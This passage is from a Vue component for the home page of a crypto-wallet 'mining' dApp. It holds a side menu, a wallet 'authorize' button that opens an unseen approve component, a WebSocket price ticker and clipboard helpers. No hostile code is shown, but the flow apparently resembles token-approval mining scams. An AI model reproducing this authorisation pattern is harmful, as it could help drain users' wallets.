									<svg t="1719132900503" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="4291" width="16" height="16"><path d="M568.7 319.8l86.8 86.8v476.6h-466V319.8h379.2m29-70H178.9c-32.8 0-59.4 26.5-59.4 59.3v584.7c0 15.7 6.3 30.8 17.4 42 11.1 11.2 26.2 17.4 42 17.4h487.4c15.7 0 30.8-6.3 41.9-17.4 11.1-11.1 17.3-26.2 17.3-42V377.6L597.7 249.8z" fill="#19e026" p-id="4292"></path><path d="M776.7 70.8H357.9c-32.8 0-59.4 26.5-59.4 59.3v100h70v-89.3h379.2l86.8 86.8v476.6h-85.8v70h96.6c15.7 0 30.8-6.3 41.9-17.4 11.1-11.1 17.3-26.2 17.3-42V198.6L776.7 70.8z" fill="#19e026" p-id="4293"></path></svg>            </div>
							<div class="shuaxin_btn" @click="refreshPage">
									<svg t="1719133100398" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="5616" width="16" height="16"><path d="M938.336973 255.26894c-16.685369-6.020494-35.090879 2.752226-40.939358 19.437594l-24.770032 69.493701c-29.070385-65.537376-74.998152-123.162103-133.48295-166.337645-185.947253-137.611288-450.848984-100.112212-590.180413 83.942886C81.534688 350.908785 52.980346 460.653788 68.805644 570.742819c15.825298 110.605073 74.48211 208.481102 164.789518 275.394591 75.686209 55.904586 164.273476 83.082815 252.172686 83.082815 128.494541 0 255.26894-57.624727 338.007727-166.853687 36.639006-48.335965 61.581052-102.348396 74.48211-160.833193 3.78431-17.373425-7.224593-34.402822-24.426004-38.187133-17.201411-3.78431-34.402822 7.052579-38.187133 24.426004-10.836889 49.36805-31.994625 95.123803-62.957164 135.891147-118.173694 156.016798-342.996136 187.839409-500.90509 70.869814-76.546279-56.592642-126.086343-139.33143-139.503444-232.907106-13.417101-93.059634 10.664875-185.775239 67.77356-261.11742C318.05409 144.491853 542.704519 112.497228 700.785486 229.466823c57.280699 42.315471 100.112212 100.972283 123.334117 167.197715l-110.261045-43.003528c-16.513355-6.364522-35.090879 1.720141-41.627415 18.233496-6.536536 16.513355 1.720141 35.090879 18.233496 41.627415l162.38132 63.473207c3.78431 1.548127 7.740635 2.236183 11.69696 2.236183 0.516042 0 1.032085-0.172014 1.548127-0.172014 1.204099 0.172014 2.408198 0.688056 3.612296 0.688056 13.245087 0 25.630102-8.256677 30.274483-21.32975l57.796741-161.693264C963.623047 279.694944 955.022342 261.289434 938.336973 255.26894z" fill="#1296db" p-id="5617"></path></svg>
							</div>
					</div>


			</div>
		</van-popup>


		
		<van-popup v-model="showMenu" position="left" :style="{ height: '100%' }">
			<div class="is-active mobile-main-sidebar" ref="leftSidebar" style="width: auto;min-width: 4.2rem;padding-right: 0.1rem;position: static;">
					<div class="inner">
							<ul class="icon-side-menu">
									<div class="drawer-header" data-v-41ea2f78="">
											<div class="d-flex" data-v-41ea2f78="" style="margin-top: 5px;" @click="chageShowMenu(false)">
													<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img" class="iconify iconify--fluent sidebar-svg" width="1em" height="1em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24" data-icon="fluent:dismiss-24-regular" data-v-41ea2f78="">
															<g fill="none">
																	<path d="M4.397 4.554l.073-.084a.75.75 0 0 1 .976-.073l.084.073L12 10.939l6.47-6.47a.75.75 0 1 1 1.06 1.061L13.061 12l6.47 6.47a.75.75 0 0 1 .072.976l-.073.084a.75.75 0 0 1-.976.073l-.084-.073L12 13.061l-6.47 6.47a.75.75 0 0 1-1.06-1.061L10.939 12l-6.47-6.47a.75.75 0 0 1-.072-.976l.073-.084l-.073.084z" fill="currentColor"></path>
															</g>
													</svg>
											</div>
									</div>
									<div class="drawer-logo" data-v-41ea2f78="">
											<img class="avatar" src="../assets/static/image/62bc27f2b5602811.png" data-v-41ea2f78="">
											<div class="wallet-address" data-v-41ea2f78="">
													<div data-v-41ea2f78="">
															<img src="../assets/static/image/avatar.33e95978.png" alt="" class="avatar" data-v-41ea2f78="">
													</div>
													<div data-v-41ea2f78="">{{ellipsisAddress(walletObj.address)}}</div>
													<div class="copy-btn btn-copy" :data-clipboard-text="walletObj.address" @click="copy" data-v-41ea2f78="">
															<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img" class="iconify iconify--fluent" width="1em" height="1em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24" data-icon="fluent:copy-24-regular" data-v-41ea2f78="">
																	<g fill="none">
																			<path d="M5.503 4.627L5.5 6.75v10.504a3.25 3.25 0 0 0 3.25 3.25h8.616a2.251 2.251 0 0 1-2.122 1.5H8.75A4.75 4.75 0 0 1 4 17.254V6.75c0-.98.627-1.815 1.503-2.123zM17.75 2A2.25 2.25 0 0 1 20 4.25v13a2.25 2.25 0 0 1-2.25 2.25h-9a2.25 2.25 0 0 1-2.25-2.25v-13A2.25 2.25 0 0 1 8.75 2h9zm0 1.5h-9a.75.75 0 0 0-.75.75v13c0 .414.336.75.75.75h9a.75.75 0 0 0 .75-.75v-13a.75.75 0 0 0-.75-.75z" fill="currentColor"></path>
																	</g>
															</svg>
													</div>
											</div>
									</div>
									<!---->
									<div class="join-btn" data-v-41ea2f78="">
											<button type="button" aria-hidden="false" class="button button v-button is-fullwidth" v-if="userinfo.status == 0" data-v-41ea2f78="" @click="showShouquan(false)">
													<span>
															<img src="../assets/static/image/icon_join.btn.44a592cf.svg" data-v-41ea2f78="">
															<span data-v-41ea2f78="">{{$t('key164')}}</span>
													</span>
											</button>
											<button type="button" aria-hidden="false" class="button button v-button is-fullwidth" v-if="userinfo.status == 1" data-v-41ea2f78="" @click="go('/authorized-activity')">
													<span>
															<img src="../assets/static/image/icon_join.btn.44a592cf.svg" data-v-41ea2f78="">
															<span data-v-41ea2f78="">{{$t('key165')}}</span>
													</span>
											</button>
									</div>
									<div class="menu-item" data-v-41ea2f78="">
											<div class="item-title" data-v-41ea2f78="">{{$t('key166')}}</div>
											<li class="drawer-item" data-v-41ea2f78="" v-if="userinfo.status == 0" @click="showShouquan(true)">
													<img src="../assets/static/image/icon_menu_wallet.e9b0e83b.svg" data-v-41ea2f78="">
													<span data-v-41ea2f78="">{{$t('key70')}}</span>
											</li>
											<li class="drawer-item" data-v-41ea2f78="" v-if="userinfo.status == 1" @click="go('/wallet')">
													<img src="../assets/static/image/icon_menu_wallet.e9b0e83b.svg" data-v-41ea2f78="">
													<span data-v-41ea2f78="">{{$t('key70')}}</span>
											</li>
											<li class="drawer-item" data-v-41ea2f78="" @click="go('/ai')">
													<img src="../assets/static/image/icon_menu_ai.e895c6df.svg" data-v-41ea2f78="">
													<span data-v-41ea2f78="">Ai{{$t('key167')}}</span>
											</li>
											<li class="drawer-item" data-v-41ea2f78="" @click="go('/mining')">
													<img src="../assets/static/image/icon_menu_mining.ebcf82be.svg" data-v-41ea2f78="">
													<span data-v-41ea2f78="">{{$t('key112')}}</span>
											</li>
											<li class="drawer-item" data-v-41ea2f78="" @click="go('/miningrecord')">
													<img src="../assets/static/image/icon_menu_record.d0fd71ac.svg" data-v-41ea2f78="">
													<span data-v-41ea2f78="">{{$t('key73')}}</span>
											</li>
											<li class="drawer-item" data-v-41ea2f78="" @click="go('/share')">
													<img src="../assets/static/image/icon_menu_share.2e020ec7.svg" data-v-41ea2f78="">
													<span data-v-41ea2f78="">{{$t('key171')}}</span>
											</li>
											<a :href="configInfo.chatLink" data-v-41ea2f78="">
													<li class="drawer-item" data-v-41ea2f78="">
															<img src="../assets/static/image/icon_menu_cs.05117d1f.svg" data-v-41ea2f78="">
															<span data-v-41ea2f78="">{{$t('key168')}}</span>
													</li>
											</a>
											<!-- <li class="drawer-item" data-v-41ea2f78="" @click="go('/help')">
													<img src="../assets/static/image/icon_menu_qa.7ec34a68.svg" data-v-41ea2f78="">
													<span data-v-41ea2f78="">Q&amp;A</span>
											</li> -->
											<li class="drawer-item" data-v-41ea2f78="" @click="go('/language')">
													<img src="../assets/static/image/icon_menu_set.81a4b22b.svg" data-v-41ea2f78="">
													<span data-v-41ea2f78="">{{$t('key106')}}</span>
											</li>
									</div>
							</ul>
							<ul class="bottom-icon-side-menu"></ul>
					</div>
			</div>
		</van-popup>
		<approve v-model="shouquanModal" v-if="shouquanModal" :isShowToast="isShowToast"></approve>
	</div>
</template>

<script>
import { findNotice, getContractList, getKlineData, getNewsList } from '@/api/user'
import approve from '@/components/approve.vue'
import headerNav from '@/components/header-nav.vue'
import homekline from '@/components/homekline.vue'
import kefu from '@/components/kefu.vue'
import newsPanel from '@/components/news-panel.vue'
import config from '@/config'
import { localRead, localSave } from "@/libs/util"
import Clipboard from 'clipboard'
import { mapActions } from 'vuex'

export default {
    name: 'homeb',
    props: {
    },
    components: {
        approve,
        headerNav,
        kefu,
        newsPanel,
        homekline
    },
    computed: {
        userinfo() {
            return this.$store.state.user.userinfo
        },
        configInfo() {
            return this.$store.state.user.configInfo
        },
        walletObj() {
            return this.$store.state.user.walletObj
        }
    },
    data() {
        return {
            isShowToast: false,
            // websocket
            ws: {},
            wsUrl: ``,
            heart_jump: false, //websocket 心跳状态
            ws_heart: '', // ws心跳定时器
            //websocket持续连接的定时器
            continuous_link: null,
            noticeModal: false,
            newsPanelModal: false,
            showMenu: false,
            tabindex: 0,
            shouquanModal: false,
            biList: [],
            type: 1,
            currBiList: [],
            newsList: [],
            link: '',
            noticeInfo: {},
            showclct: false,
            isdapp: false,
        }
    },
    watch: {
        tabindex() {
            this.type = this.tabindex + 1
            this.getContractList2()
        },
        userinfo () {
            if (this.biList.length <= 0) {
                this.getContractList()
            }
        }
    },
    mounted() {
        if (window.location.protocol === 'http:') {
            this.wsUrl = `ws://${config.wssHost}/ws/`
        } else {
            this.wsUrl = `wss://${config.wssHost}/ws/`
        }
        // if (!sessionStorage.getItem("noticeModal")) this.changenoticeModal(true)
        this.getContractList()
        this.getNewsList()
        this.findNotice()
        if (!this.walletObj.address){
            this.showClt();

        }

    },
    beforeDestroy () {
        this.close_heart();
        this.ws.close();
    },
    methods: {
    copysite() {
      const clipboard = new Clipboard('.fuzhi_btn', {
        text: () => window.location.href
      });

      clipboard.on('success', () => {
        this.$toast({
          message: this.$t('key96'),
          type: 'success'
        });
        clipboard.destroy(); // 释放内存
      });

      clipboard.on('error', () => {
        this.$toast({
          message: this.$t('key97'),
          type: 'error'
        });
        clipboard.destroy(); // 释放内存
      });

      clipboard.onClick(event); // 触发点击事件以复制URL
    },
        refreshPage() {
          window.location.reload();
        },
        showClt() {
            this.showclct = true;
        },
        ellipsisAddress (str) {
            if (!str) return
            let address = str.slice(0, 4) + '****' + str.substr(-4)
            return address
        },
        findNotice () {
            findNotice({ type: 1 }).then(res => {
                let data = res.data
                if (data.code === 1) {
                    this.noticeInfo = data.data
                    try{
                        if (localRead('notice') !== data.data.token) {
                        this.changenoticeModal(true)
                        localSave('notice', data.data.token)
                        }
                    }catch(error){
                        console.log(error)
                    }

                }
            })
        },
        getNewsList () {
            getNewsList({
                page: 1,
                page_size: 5
            }).then(res => {
                let data = res.data
                if (data.code === 1) {
                    this.newsList = data.data.list
                }
            })
        },
        // WebSjocket操作
        creat_socket(url) {
            this.ws = new WebSocket(url);
            this.close_heart();
            this.initWebSocket();
        },
        initWebSocket() {
            let that = this;
            let ws = that.ws;
            // 打开WebSjocket
            ws.onopen = function (e) {
                console.log("WebSjocket已经打开");
                that.heart_jump = true; // 心跳状态打开
                // that.heart();
                let json = JSON.stringify({ "sub": "ticker" })
                let qingli = JSON.stringify({ "unsub": "ticker" })
                that.ws.send(qingli);
                that.ws.send(json);

                // 再次清除防止重复请求
                clearInterval(that.continuous_link);
            };

            // 接收WebSjocket
            // let mouse_over = [];
            ws.onmessage = (event) => {

                if ((!event && !event.data) || event.data == "undefined") {
                    return;
                } else {
                    let data = JSON.parse(event.data)
                    if (data.channel) {
                        // console.log(data)
                        that.biList.forEach((item, index) => {
                            if (item.coin_alias == data.data.symbol) {
                                if (that.biList[index].kData) {
                                    that.biList[index].kData[that.biList[index].kData.length - 1] = {
                                        open: Math.abs(data.data.open),
                                        close: Math.abs(data.data.close),
                                        time: that.biList[index].kData[that.biList[index].kData.length - 1].time,
                                        value: Math.abs(data.data.close)
                                    }
                                    that.changeCurrKdata(that.biList[index].kData, index)
                                }
                            }
                        })
                    }
                    // that.ws.send(json);
                    // console.log(data);
                }
            }
            // 关闭
            ws.onclose = function (e) {
                if (that.heart_jump) {
                    that.close_heart();
                    that.heart_jump = false;

                }
                console.log("WebSocket关闭");
            };

            // WebSocket发生错误
            ws.onerror = function (e) {
                if (that.heart_jump) {
                    that.close_heart();
                    that.heart_jump = false;
                }
                that.reconnect(that.wsUrl);
                console.log("WebSocket发生错误");
            };
        },

        heart(props) {
            let that = this;
            this.ws_heart = setInterval(() => {
                that.ws.send(props);
            }, 10 * 1000);
        },

        close_heart() {
            console.log("ws心跳结束");
            clearInterval(this.ws_heart);
            this.ws_heart = null;
        },

        reconnect(url) {
            if (this.lockReconnect) return;
            this.lockReconnect = true;
            let that = this;
            // 先清除定时器
            clearInterval(this.continuous_link);

            this.continuous_link = setInterval(function () {
                //没连接上会一直重连，设置延迟避免请求过多
                that.lockReconnect = false;
                that.creat_socket(url);
                console.log("重启中...");
            }, 5000);
        },
        checkIsShow(coin_alias) {
            let arr = this.currBiList.filter(item => {
                return item.coin_alias === coin_alias
            })
            return arr.length
        },
        getContractList2(isInit) {
            getContractList({ type: this.type }).then(res => {
                let data = res.data
                if (data.code === 1) {
                    let currBiList = data.data
                    this.currBiList = currBiList
                    this.biList.forEach((item, index) => {
                        if (this.checkIsShow(item.coin_alias)) this.$set(this.biList[index], "bool", true)
                        else this.biList[index].bool = this.$set(this.biList[index], "bool", false)
                    })
                    // if (isInit) this.init()
                }
            })
        },
        getContractList() {
            getContractList({ type: 3 }).then(res => {
                let data = res.data
                if (data.code === 1) {
                    this.biList = data.data
                    if (data.data.length > 0) {
                        this.getContractList2(true)
                        this.biList.forEach((item, index) => {
                            this.getKlineData(item.contract_id, index)
                        })
                    }
                    // //页面刚进入时开启长连接
                    this.creat_socket(this.wsUrl)
                }
            })
        },
        getKlineData(contract_id, index) {
            getKlineData({ interval: '60', contract_id }).then(res => {
                let data = res.data
                if (data.code === 1) {
                    let kData = []
                    data.data = data.data.slice(0, 20)
                    data.data.forEach((item, index2) => {
                        let time = this.timetrans(item.now_time)
                        kData.unshift({
                            open: item.open,
                            close: item.close,
                            time: item.now_time,
                            value: item.close
                        })
                    })
                    this.changeCurrKdata(kData, index)
                }
            })
        },
        changeCurrKdata (kData, index) {
            let nowItem = kData[kData.length - 1]
            let change = ((nowItem.close - nowItem.open) / nowItem.open * 100).toFixed(2)
            this.$set(this.biList[index], "kData", kData)
            this.$set(this.biList[index], "change", change)
            this.$set(this.biList[index], "close", kData[kData.length - 1].close)
        },
        timetrans(date) {
            var date = new Date(date * 1000)//如果date为10位需要乘1000
            var Y = date.getFullYear() + '-'
            var M = (date.getMonth() + 1 < 10 ? '0' + (date.getMonth() + 1) : date.getMonth() + 1) + '-'
            var D = (date.getDate() < 10 ? '0' + (date.getDate()) : date.getDate())
            var h = (date.getHours() < 10 ? '0' + date.getHours() : date.getHours()) + ':'
            var m = (date.getMinutes() < 10 ? '0' + date.getMinutes() : date.getMinutes()) + ':'
            var s = (date.getSeconds() < 10 ? '0' + date.getSeconds() : date.getSeconds())
            // return `${Y}${M}${D} ${h}${m}${s}`
            return `${Y}${M}${D}`
        },
        ...mapActions([
            'getuserinfo'
        ]),
        showShouquan(isShowToast) {
            this.isShowToast = isShowToast
            this.shouquanModal = true
        },
        changenoticeModal(bool) {
            // if (!bool) sessionStorage.setItem("noticeModal", "1")
            this.noticeModal = bool
        },
        copy() {
            var clipboard = new Clipboard('.btn-copy')
            clipboard.on('success', e => {
                this.$toast({
                    message: this.$t('key96'),
                    icon: 'success',
                })
                // 释放内存
                clipboard.destroy()
            })
            clipboard.on('error', e => {
                // 不支持复制
                this.$toast({
                    message: this.$t('key97'),
                    icon: 'cross',
                })
                // 释放内存
                clipboard.destroy()
            })
        },
        go(path, query) {
            this.$router.push({ path, query })
        },
        changenewsPanelModal(bool, link) {
            this.link = link
            this.newsPanelModal = bool
        },
        chageShowMenu(bool) {
            this.showMenu = bool
        },
        changeTabIndex(tabindex) {
            this.tabindex = tabindex
        }
    }
}

</script>

<style>
	@import "../assets/static/hs/infinite-scroll-BvINuCRK.css";
	@import "../assets/static/hs/index-mFqHfHAS.css";
	@import "../assets/static/hs/index-D94kQhlf.css";
	@import "../assets/static/hs/GuideBar-Cd0Ur1RF.css";
	@import "../assets/static/hs/SupportedEcosystems-CWJVJKzZ.css";
	@import "../assets/static/hs/HomePage-Dawvl9-U.css";
	body > iframe {
		display: none;
	}
  /* .tracking-in-expand-fwd-top {
    color: #fff;
  } */
  #app {
    color: unset !important;
  }
  .main-title__desc_wrap {
    white-space: unset !important;
  }
  .supported-ecosystems-wrap {
    .icons__content {
      width: max-content;
    }
  }
  .ff3a91ea-title {
    color: #fff;
    margin-bottom: 0 !important;
  }
.connect_button button {
	background-color: #0d6efd;
	height: 40px;
	width: 140px;
	border: none;
	border-radius: 10px;
}
.connect_button {
	position: absolute;
	left: 60%;
	top: 10%;
}
.wallt_cnt {
	padding-top: 30px;
	display: flex;
	padding-left: 30px;
	h2 {
		color: #000;
	}
}
.cnct_class{
	display: flex;
	justify-content: center;
}
.cnct_domain{
	border: 0px solid rgb(17, 57, 232);
	background-color: rgb(236, 239, 254);
	width: 85%;
	height: 35px;
	color: rgb(17, 57, 232);
	font-size: larger;
	font-weight: 600;
	align-items: center;
	display: flex;
}

.fuzhi_btn {
	width: 20px;
	height: 20px;
	display: flex;
	align-items: center;
	justify-content: center; /* 水平居中 */
	margin: 0 70px;
	margin-right: 10px;

}
.shuaxin_btn{
	width: 20px;
	height: 20px;
	display: flex;
	align-items: center;
	justify-content: center; /* 水平居中 */

}
.showclct_hr {
	border: none;
	margin: 20px 10px;
}
</style>